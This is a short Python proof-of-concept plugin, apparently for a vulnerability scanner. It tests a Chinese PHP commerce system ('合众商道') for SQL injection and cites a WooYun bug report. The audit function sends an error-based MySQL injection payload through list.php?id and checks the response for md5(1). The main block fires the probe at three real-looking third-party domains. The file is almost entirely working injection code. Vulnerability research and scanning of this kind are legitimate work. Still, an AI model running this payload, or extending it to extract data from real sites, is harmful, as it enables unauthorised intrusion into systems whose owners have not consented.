#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:合众商道php系统通用注入
#Refer:http://www.wooyun.org/bugs/wooyun-2010-083434

def assign(service,arg):
    if service=="hezhong_shangdao":
        return True,arg 
    


def  audit(arg):
    url=arg+"list.php?id=2%20AND%20(SELECT%205351%20FROM(SELECT%20COUNT(*),CONCAT(0x5c,(MID((IFNULL(CAST(md5(1)%20AS%20CHAR),0x20)),1,50)),0x5c,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_hole(url)

if __name__=="__main__":
    from dummy import *
    audit(assign('hezhong_shangdao','http://www.yxohq.com/')[1])
    audit(assign('hezhong_shangdao','http://xhmold.com.cn/')[1])
    audit(assign('hezhong_shangdao','http://bld-pcb.com/')[1])